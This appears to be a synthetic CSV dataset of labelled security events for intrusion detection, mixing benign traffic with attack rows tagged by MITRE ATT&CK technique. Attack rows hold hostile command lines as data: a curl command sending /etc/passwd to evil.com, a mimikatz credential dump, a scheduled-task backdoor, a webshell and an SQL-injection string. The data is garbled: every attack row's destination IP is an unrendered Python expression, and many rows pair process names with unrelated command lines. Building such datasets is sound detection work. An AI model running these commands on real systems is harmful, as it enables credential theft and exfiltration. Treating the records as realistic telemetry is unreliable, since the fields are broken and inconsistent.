@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-11T10:37:37.546333,attack,persistence,T1053,persistence,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,182,7,mail50,windows,root,3816,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-13T14:24:25.542954,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.6,24209,"10.0.0.{random.randint(1, 254)}",22,725,12,web2,windows,administrator,8060,bash,,,
2026-09-13T23:00:29.544283,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.10,37433,"10.0.0.{random.randint(1, 254)}",443,4697,88,backup4,linux,root,495,cmd.exe,,,evil-c2.com
2026-09-15T09:31:34.563639,benign,,,,network,success,192.168.1.228,1024,10.0.0.218,443,3807,34,app1,windows,david.moore,4547,sshd,firefox.exe,,
2026-09-09T17:25:36.545744,attack,sql_injection,T1190,initial_access,web,success,192.168.56.2,35982,"10.0.0.{random.randint(1, 254)}",80,4354,34,mail5,windows,root,4277,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T03:31:50.563646,benign,,,,network,success,192.168.1.57,5000,10.0.3.33,3306,768,8,db50,windows,emily.davis,6029,explorer.exe,firefox.exe,,
2026-09-14T01:31:14.558404,benign,,,,network,success,192.168.1.125,2048,10.0.2.14,80,7596,63,app100,windows,mark.wilson,9542,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T06:18:31.551530,benign,,,,network,success,192.168.1.195,3072,10.0.2.75,53,4105,77,srv5,windows,john.doe,2749,sshd,apache2 -DFOREGROUND,,
2026-09-15T00:46:10.548411,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,6352,8,web1,windows,administrator,5276,php,php /var/www/html/shell.php,shell.php,
2026-09-14T06:33:26.547062,attack,webshell,T1505,persistence,file,success,192.168.56.9,0,"10.0.0.{random.randint(1, 254)}",0,3193,7,workstation3,linux,admin,8225,php,php /var/www/html/shell.php,shell.php,
2026-09-14T03:55:02.557667,benign,,,,authentication,success,192.168.1.184,5000,10.0.1.4,22,7621,4,backup2,windows,admin,3899,apache2,chrome.exe --profile-directory=Default,,
2026-09-12T00:18:03.551675,benign,,,,network,success,192.168.1.121,5000,10.0.0.29,22,1879,17,backup5,windows,chris.miller,2783,nginx,apache2 -DFOREGROUND,,
2026-09-14T18:56:21.570403,benign,,,,file,success,192.168.1.204,4096,10.0.0.186,80,3372,28,web10,linux,chris.miller,9774,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-11T15:47:16.568320,benign,,,,network,success,192.168.1.6,3072,10.0.3.49,53,4152,54,backup4,linux,jane.smith,6392,sshd,chrome.exe --profile-directory=Default,,
2026-09-13T23:48:58.551310,benign,,,,network,success,192.168.1.45,3072,10.0.3.2,22,5016,57,db10,linux,mike.brown,5473,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T08:37:47.547482,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.6,31035,"10.0.0.{random.randint(1, 254)}",445,43224,224,db20,windows,administrator,9386,psexec.exe,,,
2026-09-11T18:36:28.558481,benign,,,,process,success,192.168.1.139,5000,10.0.3.44,443,2164,95,mail4,windows,mike.brown,9201,systemd,apache2 -DFOREGROUND,,
2026-09-10T15:55:07.568918,benign,,,,file,success,192.168.1.142,4096,10.0.0.79,3306,5822,1,web50,linux,sarah.jones,4125,systemd,apache2 -DFOREGROUND,,
2026-09-10T17:36:43.543927,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.5,31961,"10.0.0.{random.randint(1, 254)}",445,24603,117,backup2,windows,test,2119,psexec.exe,,,
2026-09-10T16:50:26.568777,benign,,,,process,success,192.168.1.3,5000,10.0.1.79,443,8672,97,workstation50,windows,mike.brown,6438,nginx,firefox.exe,,
2026-09-09T09:16:49.565708,benign,,,,authentication,success,192.168.1.10,8443,10.0.2.25,80,5710,68,backup50,windows,admin,9971,firefox.exe,explorer.exe,,
2026-09-12T09:53:21.557222,benign,,,,authentication,success,192.168.1.222,3072,10.0.0.137,80,9647,71,srv10,windows,david.moore,5729,systemd,apache2 -DFOREGROUND,,
2026-09-14T14:08:42.571062,benign,,,,process,success,192.168.1.195,8443,10.0.1.134,53,9448,19,backup2,windows,mark.wilson,6617,sshd,firefox.exe,,
2026-09-12T10:05:31.563980,benign,,,,process,success,192.168.1.214,8443,10.0.5.59,22,820,91,web10,windows,david.moore,6280,explorer.exe,apache2 -DFOREGROUND,,
2026-09-09T01:54:25.556787,benign,,,,authentication,success,192.168.1.40,4096,10.0.1.196,3306,8336,17,app10,windows,lisa.wilson,3780,explorer.exe,apache2 -DFOREGROUND,,
2026-09-10T10:01:55.569291,benign,,,,network,success,192.168.1.103,4096,10.0.1.60,3306,5688,27,backup2,linux,jane.smith,2472,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-14T13:29:55.541720,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,26313,"10.0.0.{random.randint(1, 254)}",22,636,5,srv2,windows,admin,4022,python3,,,
2026-09-13T23:25:23.567956,benign,,,,network,success,192.168.1.192,1024,10.0.1.102,3306,8212,3,srv4,windows,mike.brown,6678,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-13T23:35:07.571194,benign,,,,process,success,192.168.1.252,1024,10.0.5.201,53,2470,97,srv5,windows,sarah.jones,4221,chrome.exe,firefox.exe,,
2026-09-13T21:27:44.560844,benign,,,,process,success,192.168.1.61,8443,10.0.5.72,3306,6531,100,web10,windows,mark.wilson,4493,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T23:09:25.562375,benign,,,,network,success,192.168.1.166,8443,10.0.3.17,53,611,48,srv20,windows,david.moore,2373,chrome.exe,firefox.exe,,
2026-09-10T06:42:27.567184,benign,,,,network,success,192.168.1.39,1024,10.0.1.84,3306,7914,89,web20,linux,admin,8311,chrome.exe,apache2 -DFOREGROUND,,
2026-09-15T16:25:35.563256,benign,,,,process,success,192.168.1.110,2048,10.0.3.231,80,9212,85,srv3,linux,john.doe,1193,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-08T20:07:30.561068,benign,,,,authentication,success,192.168.1.87,1024,10.0.0.249,53,1175,55,workstation4,windows,emily.davis,1826,nginx,apache2 -DFOREGROUND,,
2026-09-14T02:59:07.547368,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,41773,"10.0.0.{random.randint(1, 254)}",445,41272,330,workstation10,windows,admin,5053,psexec.exe,,,
2026-09-15T07:33:16.569167,benign,,,,process,success,192.168.1.219,3072,10.0.0.105,443,1365,35,db100,windows,sarah.jones,7339,chrome.exe,apache2 -DFOREGROUND,,
2026-09-15T03:33:59.564768,benign,,,,network,success,192.168.1.4,1024,10.0.5.142,53,7235,7,web1,linux,admin,401,firefox.exe,explorer.exe,,
2026-09-11T09:31:36.556572,benign,,,,network,success,192.168.1.223,4096,10.0.1.199,80,4511,74,backup4,linux,admin,3768,explorer.exe,firefox.exe,,
2026-09-14T05:59:24.549400,benign,,,,file,success,192.168.1.186,1024,10.0.0.56,3306,1051,24,web20,linux,sarah.jones,7460,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-13T21:11:37.565895,benign,,,,authentication,success,192.168.1.32,2048,10.0.5.85,53,3221,59,srv1,linux,mark.wilson,3538,chrome.exe,apache2 -DFOREGROUND,,
2026-09-14T01:43:18.557672,benign,,,,authentication,success,192.168.1.39,8443,10.0.2.173,443,604,92,web4,windows,david.moore,2160,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T11:39:07.551334,benign,,,,network,success,192.168.1.112,8443,10.0.3.93,22,4859,30,web100,linux,john.doe,5929,chrome.exe,explorer.exe,,
2026-09-15T00:56:32.564808,benign,,,,authentication,success,192.168.1.148,3072,10.0.1.37,53,778,53,workstation3,linux,admin,8710,systemd,chrome.exe --profile-directory=Default,,
2026-09-14T19:19:57.558654,benign,,,,file,success,192.168.1.251,2048,10.0.5.105,22,399,44,app4,linux,chris.miller,3322,systemd,explorer.exe,,
2026-09-15T08:43:34.567933,benign,,,,authentication,success,192.168.1.89,5000,10.0.0.50,443,4019,35,workstation5,windows,lisa.wilson,8524,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T02:52:52.540647,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.9,14057,"10.0.0.{random.randint(1, 254)}",445,19380,202,db2,linux,test,3977,psexec.exe,,,
2026-09-15T00:55:24.552218,benign,,,,network,success,192.168.1.47,3072,10.0.0.29,80,1091,9,db3,linux,mark.wilson,9015,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T13:48:03.555973,benign,,,,process,success,192.168.1.113,3072,10.0.5.102,22,684,17,app100,linux,mark.wilson,6889,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-15T03:33:12.563632,benign,,,,authentication,success,192.168.1.232,3072,10.0.1.123,80,7814,81,workstation10,linux,mike.brown,6735,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-10T20:30:59.563694,benign,,,,process,success,192.168.1.114,3072,10.0.5.2,443,1652,71,backup50,linux,admin,5476,firefox.exe,apache2 -DFOREGROUND,,
2026-09-11T15:18:01.544899,attack,persistence,T1053,persistence,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,511,5,web2,windows,test,5883,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-10T00:29:55.547071,attack,port_scan,T1046,discovery,network,success,192.168.56.10,42185,"10.0.0.{random.randint(1, 254)}",445,4846,29,backup4,windows,admin,4459,python3,,,
2026-09-14T14:05:20.558487,benign,,,,process,success,192.168.1.38,2048,10.0.4.65,80,1076,96,srv1,windows,admin,4063,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T06:30:58.559372,benign,,,,process,success,192.168.1.132,8443,10.0.0.112,443,5962,29,db20,windows,lisa.wilson,9574,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-15T00:18:16.556968,benign,,,,authentication,success,192.168.1.156,2048,10.0.0.146,22,3499,73,backup20,linux,john.doe,7608,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T05:51:06.568055,benign,,,,network,success,192.168.1.26,3072,10.0.5.212,3306,4558,83,app100,windows,chris.miller,8791,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T23:45:49.566900,benign,,,,network,success,192.168.1.61,4096,10.0.5.229,80,2463,44,workstation1,windows,admin,6695,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-10T10:45:27.560706,benign,,,,file,success,192.168.1.196,5000,10.0.0.191,443,8812,99,mail50,windows,sarah.jones,4836,apache2,chrome.exe --profile-directory=Default,,
2026-09-10T20:06:53.546634,attack,webshell,T1505,persistence,file,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,1212,8,workstation4,windows,admin,8562,php,php /var/www/html/shell.php,shell.php,
2026-09-11T15:12:00.542472,attack,port_scan,T1046,discovery,network,success,192.168.56.4,30287,"10.0.0.{random.randint(1, 254)}",80,1709,49,web3,linux,test,934,python3,,,
2026-09-08T22:22:17.557973,benign,,,,process,success,192.168.1.78,3072,10.0.4.199,22,396,44,workstation100,windows,david.moore,9436,apache2,explorer.exe,,
2026-09-09T00:01:45.567093,benign,,,,process,success,192.168.1.238,2048,10.0.3.28,22,204,38,srv20,linux,mike.brown,651,sshd,apache2 -DFOREGROUND,,
2026-09-10T00:57:11.557067,benign,,,,network,success,192.168.1.93,1024,10.0.4.199,53,8256,84,web1,linux,john.doe,4824,explorer.exe,apache2 -DFOREGROUND,,
2026-09-08T22:22:14.548016,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.5,2690,"10.0.0.{random.randint(1, 254)}",445,45882,312,workstation3,linux,root,6050,psexec.exe,,,
2026-09-13T17:05:32.549645,benign,,,,network,success,192.168.1.170,8443,10.0.1.101,22,3823,49,backup1,linux,emily.davis,530,systemd,explorer.exe,,
2026-09-13T04:48:17.545758,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,32428,"10.0.0.{random.randint(1, 254)}",443,6676,25,backup50,windows,root,9817,cmd.exe,,,evil-c2.com
2026-09-15T06:49:45.547476,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.9,61571,"10.0.0.{random.randint(1, 254)}",22,1827,12,backup1,windows,guest,2109,powershell.exe,,,
2026-09-09T17:26:56.562016,benign,,,,process,success,192.168.1.39,3072,10.0.1.183,80,8873,64,app20,linux,sarah.jones,363,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-14T16:32:44.540728,attack,port_scan,T1046,discovery,network,success,192.168.56.8,65061,"10.0.0.{random.randint(1, 254)}",80,3896,1,backup10,linux,administrator,9408,powershell.exe,,,
2026-09-13T01:16:13.568363,benign,,,,process,success,192.168.1.57,8443,10.0.5.106,80,2079,77,workstation50,linux,chris.miller,1597,explorer.exe,firefox.exe,,
2026-09-13T13:02:51.555154,benign,,,,network,success,192.168.1.85,8443,10.0.2.116,443,8144,34,workstation2,linux,jane.smith,9858,systemd,apache2 -DFOREGROUND,,
2026-09-09T18:21:13.563363,benign,,,,network,success,192.168.1.178,2048,10.0.5.109,22,5089,28,mail100,windows,chris.miller,2961,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T11:09:31.563626,benign,,,,network,success,192.168.1.99,8443,10.0.5.65,22,8073,10,mail2,windows,mark.wilson,1432,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T21:01:12.554112,benign,,,,process,success,192.168.1.162,5000,10.0.2.230,3306,3693,87,mail50,windows,david.moore,9615,apache2,apache2 -DFOREGROUND,,
2026-09-12T19:52:34.542608,attack,port_scan,T1046,discovery,network,success,192.168.56.7,29166,"10.0.0.{random.randint(1, 254)}",3389,4827,12,app10,linux,root,2332,cmd.exe,,,
2026-09-09T04:46:36.567324,benign,,,,file,success,192.168.1.100,2048,10.0.4.73,443,9159,40,srv4,windows,admin,8548,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-10T13:15:22.551385,benign,,,,authentication,success,192.168.1.170,5000,10.0.3.35,80,9933,72,srv3,linux,john.doe,7874,chrome.exe,explorer.exe,,
2026-09-09T05:37:27.568545,benign,,,,authentication,success,192.168.1.232,1024,10.0.5.127,443,6180,41,srv2,linux,chris.miller,2457,sshd,chrome.exe --profile-directory=Default,,
2026-09-10T04:41:57.560724,benign,,,,process,success,192.168.1.119,8443,10.0.1.135,443,3380,16,db2,linux,mark.wilson,9870,nginx,explorer.exe,,
2026-09-15T11:21:20.559194,benign,,,,network,success,192.168.1.2,8443,10.0.4.99,443,9044,40,srv5,windows,chris.miller,8173,sshd,firefox.exe,,
2026-09-13T03:53:16.549038,benign,,,,network,success,192.168.1.124,5000,10.0.0.180,80,1940,5,backup4,linux,mark.wilson,8141,firefox.exe,apache2 -DFOREGROUND,,
2026-09-13T05:53:51.560742,benign,,,,authentication,success,192.168.1.158,2048,10.0.1.138,22,5933,48,app20,windows,sarah.jones,6634,sshd,firefox.exe,,
2026-09-15T00:37:31.545005,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,1466,4,mail2,linux,administrator,2347,php,php /var/www/html/shell.php,shell.php,
2026-09-11T13:51:34.543069,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.7,65494,"10.0.0.{random.randint(1, 254)}",443,8544,49,web1,linux,guest,4041,powershell.exe,,,evil-c2.com
2026-09-12T19:00:52.541044,attack,credential_dump,T1003,credential_access,process,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,1435,2,app100,windows,guest,5817,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-10T17:02:58.547903,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.10,27281,"10.0.0.{random.randint(1, 254)}",443,16159,212,db100,linux,test,5421,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-13T03:18:00.563075,benign,,,,authentication,success,192.168.1.249,3072,10.0.1.177,3306,6111,42,db100,linux,mark.wilson,7237,firefox.exe,firefox.exe,,
2026-09-10T01:04:04.552869,benign,,,,network,success,192.168.1.190,2048,10.0.3.137,80,2455,81,mail5,windows,david.moore,6215,sshd,firefox.exe,,
2026-09-12T08:42:45.546608,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.5,3392,"10.0.0.{random.randint(1, 254)}",22,981,18,srv50,linux,admin,5845,cmd.exe,,,
2026-09-12T16:15:58.558103,benign,,,,authentication,success,192.168.1.185,1024,10.0.2.226,443,8076,71,srv10,windows,lisa.wilson,883,firefox.exe,firefox.exe,,
2026-09-10T22:09:01.550470,benign,,,,process,success,192.168.1.55,8443,10.0.5.27,80,5067,42,mail50,linux,sarah.jones,526,apache2,apache2 -DFOREGROUND,,
2026-09-14T23:02:36.561571,benign,,,,authentication,success,192.168.1.56,5000,10.0.5.143,80,1293,93,srv20,linux,chris.miller,4420,chrome.exe,firefox.exe,,
2026-09-09T15:54:51.543338,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,49823,"10.0.0.{random.randint(1, 254)}",443,3969,28,srv10,windows,administrator,3956,bash,,,evil-c2.com
2026-09-14T03:38:34.570866,benign,,,,network,success,192.168.1.92,2048,10.0.4.5,80,1454,28,srv5,windows,david.moore,1865,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-12T02:02:57.552080,benign,,,,network,success,192.168.1.87,3072,10.0.0.252,53,1999,69,workstation5,linux,admin,3183,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T06:20:31.545586,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.7,40875,"10.0.0.{random.randint(1, 254)}",8080,20718,479,app2,linux,administrator,4398,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-14T21:12:25.556091,benign,,,,process,success,192.168.1.239,4096,10.0.0.1,3306,7118,47,db3,windows,emily.davis,632,nginx,chrome.exe --profile-directory=Default,,
2026-09-13T01:07:46.543245,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,25544,"10.0.0.{random.randint(1, 254)}",445,5484,176,workstation50,linux,admin,6184,psexec.exe,,,
2026-09-12T08:41:19.550748,benign,,,,file,success,192.168.1.74,2048,10.0.3.183,22,9907,62,app2,windows,david.moore,9589,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T07:45:38.558039,benign,,,,file,success,192.168.1.51,1024,10.0.1.164,3306,5199,69,db50,windows,emily.davis,6779,nginx,explorer.exe,,
2026-09-14T07:22:11.567811,benign,,,,file,success,192.168.1.73,4096,10.0.3.80,443,4189,55,mail5,windows,john.doe,5973,firefox.exe,apache2 -DFOREGROUND,,
2026-09-14T00:10:35.564267,benign,,,,authentication,success,192.168.1.117,4096,10.0.4.54,443,493,26,web10,linux,david.moore,7134,sshd,firefox.exe,,
2026-09-10T12:45:20.549279,benign,,,,network,success,192.168.1.34,3072,10.0.2.137,53,431,90,db4,linux,jane.smith,1944,sshd,firefox.exe,,
2026-09-09T06:48:16.543817,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.4,12549,"10.0.0.{random.randint(1, 254)}",22,1017,15,mail100,windows,test,745,bash,,,
2026-09-12T15:21:54.570414,benign,,,,process,success,192.168.1.145,2048,10.0.4.207,53,8353,69,backup10,windows,david.moore,3182,systemd,chrome.exe --profile-directory=Default,,
2026-09-13T19:28:33.545685,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.10,31073,"10.0.0.{random.randint(1, 254)}",443,8685,17,workstation50,windows,admin,5163,cmd.exe,,,evil-c2.com
2026-09-13T02:39:46.566705,benign,,,,authentication,success,192.168.1.106,2048,10.0.4.8,53,2390,50,mail20,linux,john.doe,888,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T20:19:26.556684,benign,,,,authentication,success,192.168.1.120,1024,10.0.2.152,22,4451,70,web1,linux,mark.wilson,160,systemd,firefox.exe,,
2026-09-12T21:55:17.549797,benign,,,,network,success,192.168.1.158,1024,10.0.2.146,3306,1499,18,web4,windows,david.moore,6842,nginx,explorer.exe,,
2026-09-10T14:45:42.568133,benign,,,,authentication,success,192.168.1.76,1024,10.0.5.42,80,1854,53,web1,linux,admin,3067,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T08:21:35.554442,benign,,,,authentication,success,192.168.1.172,5000,10.0.0.226,53,3345,87,workstation20,linux,mark.wilson,1297,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T14:06:04.541121,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.4,40688,"10.0.0.{random.randint(1, 254)}",445,48823,329,app100,linux,test,2318,psexec.exe,,,
2026-09-12T20:56:08.555330,benign,,,,network,success,192.168.1.215,1024,10.0.2.175,80,4480,34,srv2,linux,sarah.jones,5861,explorer.exe,sshd: /usr/sbin/sshd [listener],,
